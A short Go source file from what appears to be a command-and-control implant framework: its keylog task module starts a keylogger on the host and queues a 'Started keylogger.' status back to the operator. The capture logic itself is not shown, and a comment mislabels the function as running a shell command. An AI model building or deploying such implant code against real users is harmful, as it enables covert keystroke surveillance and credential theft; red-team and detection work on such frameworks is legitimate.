package keylog

import (
	"encoding/json"
	"fmt"
	"pkg/profiles"

	"keylog/keystate"
	"pkg/utils/structs"
	"sync"
)

var mu sync.Mutex

//Run - Function that executes the shell command
func Run(task structs.Task) {

	msg := structs.Response{}
	msg.TaskID = task.TaskID

	err := keystate.StartKeylogger(task)

	if err != nil {
		msg.UserOutput = err.Error()
		msg.Completed = true
		msg.Status = "error"

		resp, _ := json.Marshal(msg)
		mu.Lock()
		profiles.TaskResponses = append(profiles.TaskResponses, resp)
		mu.Unlock()
		return
	}
	msg.Completed = true
	msg.UserOutput = fmt.Sprintf("Started keylogger.")
	resp, _ := json.Marshal(msg)
	mu.Lock()
	profiles.TaskResponses = append(profiles.TaskResponses, resp)
	mu.Unlock()
	return
}
